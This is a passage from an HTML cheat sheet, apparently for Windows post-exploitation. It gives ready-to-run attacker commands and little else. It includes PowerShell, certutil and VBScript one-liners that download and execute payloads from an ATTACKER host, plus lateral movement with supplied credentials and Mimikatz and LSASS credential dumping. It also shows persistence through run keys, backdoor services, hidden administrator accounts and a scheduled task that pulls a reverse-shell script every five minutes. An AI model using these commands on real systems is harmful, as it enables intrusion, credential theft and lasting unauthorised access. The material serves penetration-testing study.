                    <tr><td>SeTakeOwnershipPrivilege</td><td>takeown + icacls</td><td>Built-in</td></tr>
                </table>
                
                <div class="note">Kernel exploits (check before running):</div>
                <pre># Check Windows version
systeminfo | findstr /B /C:"OS Name" /C:"OS Version"
wmic os get caption,version,buildnumber

# Common kernel exploits
# EternalBlue (MS17-010) - Windows 7/2008
# SMBGhost (CVE-2020-0796) - Windows 10 v1903/1909
# PrintNightmare (CVE-2021-1675) - Print Spooler
# Zerologon (CVE-2020-1472) - Domain Controllers

# Windows Exploit Suggester
# https://github.com/AonCyberLabs/Windows-Exploit-Suggester</pre>
            </section>
            
            <div id="windows-filetransfer" class="cmd-header" onclick="toggleSection(this)">
                <h3>FILE TRANSFER & DOWNLOADS</h3>
                <span class="toggle-icon">▼</span>
            </div>
            <section class="sec-body">
                <div class="section-explanation">Transfer files to/from Windows systems for tools and exploitation</div>
                
                <div class="note">PowerShell downloads:</div>
                <pre># PowerShell v3+ (Windows 8/2012+)
powershell -c "Invoke-WebRequest -Uri 'http://ATTACKER/file.exe' -OutFile 'C:\Windows\Temp\file.exe'"
powershell -c "(New-Object Net.WebClient).DownloadFile('http://ATTACKER/file.exe','file.exe')"
powershell -c "IEX(New-Object Net.WebClient).DownloadString('http://ATTACKER/script.ps1')"

# PowerShell one-liner with bypass
powershell -exec bypass -c "(New-Object Net.WebClient).DownloadFile('http://ATTACKER/file.exe','file.exe')"
powershell -nop -exec bypass -c "iwr http://ATTACKER/file.exe -OutFile file.exe"

# Bitsadmin (built-in)
bitsadmin /transfer job /download /priority high http://ATTACKER/file.exe C:\Windows\Temp\file.exe</pre>
                
                <div class="note">CertUtil (built-in Windows):</div>
                <pre>certutil -urlcache -split -f http://ATTACKER/file.exe file.exe
certutil -urlcache -f http://ATTACKER/file.exe file.exe

# Using certutil to encode/decode (for bypassing restrictions)
certutil -encode input.exe encoded.txt
# On target: certutil -decode encoded.txt output.exe</pre>
                
                <div class="note">SMB file transfer:</div>
                <pre># From Windows to Windows
copy \\ATTACKER\share\file.exe C:\Windows\Temp\file.exe

# Map network drive
net use Z: \\ATTACKER\share
copy Z:\file.exe C:\Windows\Temp\
net use Z: /delete</pre>
                
                <div class="note">FTP transfer:</div>
                <pre># Create FTP script
echo open ATTACKER_IP 21> ftp.txt
echo USER anonymous>> ftp.txt
echo anonymous>> ftp.txt
echo bin>> ftp.txt
echo GET file.exe>> ftp.txt
echo bye>> ftp.txt
ftp -s:ftp.txt

# PowerShell FTP
powershell -c "(New-Object Net.WebClient).DownloadFile('ftp://ATTACKER/file.exe','file.exe')"</pre>
                
                <div class="note">VBScript downloader:</div>
                <pre>echo Set x=CreateObject("Microsoft.XMLHTTP") > dl.vbs
echo x.Open "GET","http://ATTACKER/file.exe",0 >> dl.vbs
echo x.Send >> dl.vbs
echo Set s=CreateObject("ADODB.Stream") >> dl.vbs
echo s.Type=1 >> dl.vbs
echo s.Open >> dl.vbs
echo s.Write x.ResponseBody >> dl.vbs
echo s.SaveToFile "file.exe",2 >> dl.vbs
cscript dl.vbs</pre>
                
                <div class="note">Base64 encoding/decoding:</div>
                <pre># PowerShell base64 encode file
[Convert]::ToBase64String([IO.File]::ReadAllBytes("file.exe")) > encoded.txt

# PowerShell base64 decode
[IO.File]::WriteAllBytes("file.exe", [Convert]::FromBase64String("base64_string_here"))

# CertUtil base64
certutil -encode input.exe encoded.txt
certutil -decode encoded.txt output.exe</pre>
            </section>
            
            <div id="ad-enum" class="cmd-header" onclick="toggleSection(this)">
                <h3>ACTIVE DIRECTORY ENUMERATION</h3>
                <span class="toggle-icon">▼</span>
            </div>
            <section class="sec-body">
                <div class="section-explanation">Active Directory enumeration after obtaining domain user access</div>
                
                <div class="note">Basic domain enumeration:</div>
                <pre># Domain information
net view /domain
net view /domain:DOMAIN_NAME
nltest /domain_trusts
nltest /dclist:DOMAIN_NAME

# Domain users and groups
net user /domain
net group /domain
net group "Domain Admins" /domain
net group "Domain Users" /domain
net group "Enterprise Admins" /domain
net group "Schema Admins" /domain

# Computers in domain
net view /domain:DOMAIN_NAME
net group "Domain Computers" /domain</pre>
                
                <div class="note">PowerShell AD enumeration:</div>
                <pre># Using AD module (if installed)
Get-ADDomain
Get-ADDomainController
Get-ADUser -Filter * | Select-Object SamAccountName
Get-ADGroup -Filter * | Select-Object Name
Get-ADGroupMember -Identity "Domain Admins"
Get-ADComputer -Filter * | Select-Object Name

# Using .NET classes
[System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain()
([System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain()).DomainControllers</pre>
                
                <div class="note">BloodHound/SharpHound collection:</div>
                <pre># SharpHound collection
SharpHound.exe -c All --zipfilename bloodhound.zip
SharpHound.exe -c Group,LocalGroup,Sessions,LoggedOn,Trusts --zipfilename quick.zip
SharpHound.exe --CollectionMethod DCOnly

# BloodHound Python (from attacker)
bloodhound-python -d DOMAIN -u USER -p 'PASSWORD' -ns DC_IP -c All
bloodhound-python -d DOMAIN -u USER -p 'PASSWORD' -dc DC_NAME -c All</pre>
                
                <div class="note">Kerberos attacks (from compromised system):</div>
                <pre># Kerberoasting (TGS-REP)
# Using Rubeus
Rubeus.exe kerberoast /outfile:hashes.txt
Rubeus.exe kerberoast /user:svc_account /outfile:hash.txt

# Using PowerShell
Add-Type -AssemblyName System.IdentityModel
New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList "MSSQLSvc/dc.domain.local"

# AS-REP Roasting
Rubeus.exe asreproast /format:hashcat /outfile:hashes.txt</pre>
                
                <div class="note">Lateral movement techniques:</div>
                <pre># PsExec (Sysinternals)
PsExec.exe \\TARGET -u DOMAIN\USER -p PASSWORD cmd.exe
PsExec.exe \\TARGET -u DOMAIN\USER -p PASSWORD -s cmd.exe  # SYSTEM

# WMI execution
wmic /node:TARGET /user:DOMAIN\USER /password:PASSWORD process call create "cmd.exe /c whoami"
wmic /node:TARGET process call create "cmd.exe /c ipconfig"

# WinRM (if enabled)
winrs -r:TARGET -u:DOMAIN\USER -p:PASSWORD cmd
Enter-PSSession -ComputerName TARGET -Credential DOMAIN\USER

# Scheduled task
schtasks /create /s TARGET /u DOMAIN\USER /p PASSWORD /tn "Task" /tr "cmd.exe /c whoami" /sc once /st 00:00
schtasks /run /s TARGET /u DOMAIN\USER /p PASSWORD /tn "Task"</pre>
            </section>
            
            <div class="cmd-header" onclick="toggleSection(this)">
                <h3>CREDENTIAL DUMPING & EXTRACTION</h3>
                <span class="toggle-icon">▼</span>
            </div>
            <section class="sec-body">
                <div class="section-explanation">Extract credentials, hashes, and tickets from Windows systems</div>
                
                <div class="note">Mimikatz (requires admin/System):</div>
                <pre># Dump LSASS memory
privilege::debug
sekurlsa::logonpasswords
sekurlsa::tickets /export

# Dump SAM
token::elevate
lsadump::sam

# Dump LSA secrets
lsadump::secrets

# Dump DC hashes (DCSync)
lsadump::dcsync /domain:DOMAIN /all /csv

# Pass the hash
sekurlsa::pth /user:USER /domain:DOMAIN /ntlm:HASH /run:cmd.exe</pre>
                
                <div class="note">Procdump + Mimikatz (alternative):</div>
                <pre># Dump LSASS with procdump (Microsoft signed)
procdump.exe -accepteula -ma lsass.exe lsass.dmp

# Analyze dump with mimikatz
mimikatz.exe "sekurlsa::minidump lsass.dmp" "sekurlsa::logonpasswords" exit</pre>
                
                <div class="note">Registry credential extraction:</div>
                <pre># SAM and SYSTEM hives
reg save HKLM\SAM sam.save
reg save HKLM\SYSTEM system.save
reg save HKLM\SECURITY security.save

# Extract with secretsdump.py (on attacker)
# python3 secretsdump.py -sam sam.save -system system.save LOCAL

# Check for saved credentials
cmdkey /list
dir /a %USERPROFILE%\AppData\Local\Microsoft\Credentials\*
dir /a %USERPROFILE%\AppData\Roaming\Microsoft\Credentials\*</pre>
                
                <div class="note">Search for credentials in files:</div>
                <pre>findstr /si password *.txt *.xml *.ini *.config
findstr /spin "password" *.*
findstr /si "pwd\|pass\|login\|user" *.txt *.xml *.ini *.config *.vbs *.bat

# PowerShell search
Get-ChildItem -Path C:\ -Include *.txt,*.xml,*.ini,*.config -Recurse -ErrorAction SilentlyContinue | Select-String -Pattern "password" | Select-Object -First 20</pre>
                
                <div class="note">Browser credential extraction:</div>
                <pre># Chrome passwords
# Location: %LOCALAPPDATA%\Google\Chrome\User Data\Default\Login Data

# Firefox passwords
# Location: %APPDATA%\Mozilla\Firefox\Profiles\*.default-release\logins.json
# With key4.db and cert9.db

# Tools for extraction
# LaZagne: https://github.com/AlessandroZ/LaZagne
# SharpChromium: https://github.com/djhohnstein/SharpChromium</pre>
                
                <div class="note">DPAPI credential extraction:</div>
                <pre># Using Mimikatz
dpapi::cred /in:"C:\Users\USER\AppData\Local\Microsoft\Credentials\*"

# Using SharpDPAPI
SharpDPAPI.exe credentials
SharpDPAPI.exe certificates
SharpDPAPI.exe vaults</pre>
            </section>
            
            <div class="cmd-header" onclick="toggleSection(this)">
                <h3>PERSISTENCE & MAINTAINING ACCESS</h3>
                <span class="toggle-icon">▼</span>
            </div>
            <section class="sec-body">
                <div class="section-explanation">Techniques to maintain access to compromised Windows systems</div>
                
                <div class="note">Registry persistence:</div>
                <pre># Current user run key
reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v Backdoor /t REG_SZ /d "C:\Windows\Temp\backdoor.exe"

# Local machine run key (requires admin)
reg add "HKLM\Software\Microsoft\Windows\CurrentVersion\Run" /v Backdoor /t REG_SZ /d "C:\Windows\Temp\backdoor.exe"

# RunOnce keys
reg add "HKLM\Software\Microsoft\Windows\CurrentVersion\RunOnce" /v Backdoor /t REG_SZ /d "C:\Windows\Temp\backdoor.exe"

# Services (requires admin)
sc create Backdoor binPath= "C:\Windows\Temp\backdoor.exe" start= auto
sc start Backdoor</pre>
                
                <div class="note">Scheduled tasks:</div>
                <pre># Create scheduled task (admin for SYSTEM)
schtasks /create /tn "WindowsUpdate" /tr "C:\Windows\Temp\backdoor.exe" /sc onstart /ru SYSTEM
schtasks /create /tn "BackupTask" /tr "powershell -ep bypass -c IEX(New-Object Net.WebClient).DownloadString('http://ATTACKER/rev.ps1')" /sc minute /mo 5

# Trigger task
schtasks /run /tn "WindowsUpdate"

# PowerShell scheduled task
Register-ScheduledTask -TaskName "Maintenance" -Trigger (New-ScheduledTaskTrigger -AtStartup) -Action (New-ScheduledTaskAction -Execute "C:\Windows\Temp\backdoor.exe") -RunLevel Highest</pre>
                
                <div class="note">New user creation:</div>
                <pre># Local user
net user backdoor Backdoor123! /add
net localgroup administrators backdoor /add

# Domain user (if domain admin)
net user backdoor Backdoor123! /add /domain
net group "Domain Admins" backdoor /add /domain

# Hidden user (add $ to name)
net user backdoor$ Backdoor123! /add
net localgroup administrators backdoor$ /add</pre>
                
                <div class="note">Backdoor services:</div>
                <pre># Create new service
sc create "WindowsUpdateService" binPath= "C:\Windows\Temp\backdoor.exe" start= auto
sc start WindowsUpdateService

# Modify existing service
sc config "SomeService" binPath= "C:\Windows\Temp\backdoor.exe"
sc stop SomeService
sc start SomeService</pre>
                
                <div class="note">Startup folder:</div>
                <pre># Current user startup
copy backdoor.exe "%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup\"

# All users startup (requires admin)
copy backdoor.exe "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp\"</pre>
                
                <div class="note">WMI event subscription:</div>
                <pre># Create WMI event trigger
$FilterArgs = @{name='BackdoorFilter';
                EventNameSpace='root\CimV2';
                QueryLanguage="WQL";
                Query="SELECT * FROM __InstanceModificationEvent WITHIN 60 WHERE TargetInstance ISA 'Win32_PerfFormattedData_PerfOS_System' AND TargetInstance.SystemUpTime >= 240 AND TargetInstance.SystemUpTime < 325"};
$Filter=New-Object Management.ManagementEventWatcher($FilterArgs)

# Requires more setup but very stealthy</pre>
            </section>
            
            <div class="cmd-header" onclick="toggleSection(this)">
                <h3>AUTOMATED TOOLS & SCRIPTS</h3>
                <span class="toggle-icon">▼</span>
            </div>
            <section class="sec-body">
                <div class="section-explanation">Useful Windows post-exploitation tools and scripts</div>
                
                <ul>
                    <li><strong>WinPEAS</strong>: <code>https://github.com/carlospolop/PEASS-ng/tree/master/winPEAS</code>
                        <pre>winpeas.exe
winpeas.exe quiet
winpeas.exe notcolor</pre>
                    </li>
                    
                    <li><strong>PowerUp.ps1</strong>: <code>https://github.com/PowerShellMafia/PowerSploit/blob/master/Privesc/PowerUp.ps1</code>
                        <pre>powershell -ep bypass -c "IEX(New-Object Net.WebClient).DownloadString('http://ATTACKER/PowerUp.ps1'); Invoke-AllChecks"</pre>
                    </li>
                    
                    <li><strong>Seatbelt</strong>: <code>https://github.com/GhostPack/Seatbelt</code>
                        <pre>Seatbelt.exe -group=all
Seatbelt.exe -group=system
Seatbelt.exe UserFolderPermissions</pre>
                    </li>
                    
                    <li><strong>SharpHound</strong>: AD enumeration - <code>https://github.com/BloodHoundAD/SharpHound</code>
                        <pre>SharpHound.exe -c All
SharpHound.exe --CollectionMethod DCOnly</pre>
                    </li>
                    
                    <li><strong>Rubeus</strong>: Kerberos exploitation - <code>https://github.com/GhostPack/Rubeus</code>
                        <pre>Rubeus.exe kerberoast
Rubeus.exe asreproast
Rubeus.exe harvest /interval:30</pre>
                    </li>
                    
                    <li><strong>Mimikatz</strong>: Credential extraction - <code>https://github.com/gentilkiwi/mimikatz</code>
                        <pre>mimikatz.exe "privilege::debug" "sekurlsa::logonpasswords" exit</pre>
                    </li>
                    
                    <li><strong>LaZagne</strong>: Password recovery - <code>https://github.com/AlessandroZ/LaZagne</code>
                        <pre>laZagne.exe all
laZagne.exe browsers</pre>
                    </li>
                    
                    <li><strong>SharpDPAPI</strong>: DPAPI extraction - <code>https://github.com/GhostPack/SharpDPAPI</code>
                        <pre>SharpDPAPI.exe credentials
SharpDPAPI.exe certificates</pre>
                    </li>
                    
                    <li><strong>Windows Exploit Suggester</strong>: <code>https://github.com/AonCyberLabs/Windows-Exploit-Suggester</code>
                        <pre># First: systeminfo > sysinfo.txt on target
# Then on attacker: windows-exploit-suggester.py --database 2021-06-10-mssb.xlsx --systeminfo sysinfo.txt</pre>
                    </li>
                    
                    <li><strong>PowerView</strong>: AD enumeration - <code>https://github.com/PowerShellMafia/PowerSploit/blob/master/Recon/PowerView.ps1</code>
                        <pre>powershell -ep bypass -c "IEX(New-Object Net.WebClient).DownloadString('http://ATTACKER/PowerView.ps1'); Get-NetDomain"</pre>
                    </li>
                </ul>
            </section>
        </div>
    </div>



    <script>
        // Search functionality
        document.getElementById('searchBox').addEventListener('input', function(e) {
            const searchTerm = e.target.value.toLowerCase().trim();
            
            if (searchTerm.length < 2) {
                clearSearch();
                return;
            }
            
            clearSearch();
            
            let firstMatchFound = false;
            
            const elements = document.querySelectorAll('.sec-body, pre, code, li, td, .note, .warning, .tip, .methodology, .section-explanation, h3, h4');
            elements.forEach(element => {
                const text = element.textContent || element.innerText;
                if (text.toLowerCase().includes(searchTerm)) {
                    highlightText(element, searchTerm);
                    element.classList.add('search-result');
                    
                    let section = element.closest('.sec-body');
                    if (section && !firstMatchFound) {
                        firstMatchFound = true;
                        
                        section.classList.add('active');
                        const header = section.previousElementSibling;
                        if (header && header.classList.contains('cmd-header')) {
                            header.classList.add('expanded');
                        }
                        
                        let scrollTarget = header;
                        
                        if (scrollTarget) {
                            scrollTarget.scrollIntoView({
                                behavior: 'smooth',
                                block: 'start'
                            });
                        }
                    }
                }
            });
            
            const searchBox = document.getElementById('searchBox');
            if (firstMatchFound) {
                searchBox.style.borderColor = '#44ff44';
                searchBox.style.boxShadow = '0 0 0 2px rgba(68, 255, 68, 0.2)';
            } else {
                searchBox.style.borderColor = '#ff4444';
                searchBox.style.boxShadow = '0 0 0 2px rgba(255, 68, 68, 0.2)';
            }
        });
        
        function highlightText(element, searchTerm) {
            if (element.childNodes.length === 0) return;
            
            const regex = new RegExp(`(${searchTerm.replace(/[.*+?^${}()|[\]\\]/g, '\\$&')})`, 'gi');
            const text = element.innerHTML;
            element.innerHTML = text.replace(regex, '<span class="highlight">$1</span>');
        }
        
        function clearSearch(clearInput = false) {
            if (clearInput) {
                document.getElementById('searchBox').value = '';
                document.getElementById('searchBox').style.borderColor = '';
                document.getElementById('searchBox').style.boxShadow = '';
            }
            
            document.querySelectorAll('.search-result').forEach(el => {
                el.classList.remove('search-result');
            });
            
            document.querySelectorAll('.search-section').forEach(el => {
                el.classList.remove('search-section');
            });
            
            document.querySelectorAll('.highlight').forEach(el => {
                const parent = el.parentNode;
                parent.replaceChild(document.createTextNode(el.textContent), el);
                parent.normalize();
            });
        }
        
        function toggleSection(header) {
            const content = header.nextElementSibling;
            const isExpanded = content.classList.contains('active');
            
            content.classList.toggle('active', !isExpanded);
            header.classList.toggle('expanded', !isExpanded);
        }
        
        window.onload = function() {
            document.querySelectorAll('.sec-body').forEach(content => {
                content.classList.remove('active');
            });
            
            document.querySelectorAll('.cmd-header').forEach(header => {
                header.classList.remove('expanded');
            });
        };
        
        function toggleAll() {
            const sections = document.querySelectorAll('.sec-body');
            const allCollapsed = [...sections].every(s => !s.classList.contains('active'));
            
            sections.forEach(section => {
                section.classList.toggle('active', allCollapsed);
            });
            
            document.querySelectorAll('.cmd-header').forEach(header => {
                header.classList.toggle('expanded', allCollapsed);
            });
        }
        
        function scrollToSection(sectionId) {
            const element = document.getElementById(sectionId);
            if (element) {
                element.scrollIntoView({ behavior: 'smooth', block: 'start' });
                
                const header = element;
                const content = header.nextElementSibling;
                if (content && content.classList.contains('sec-body')) {
                    content.classList.add('active');
                    header.classList.add('expanded');
                }
            }
        }
    </script>
</body>
</html>
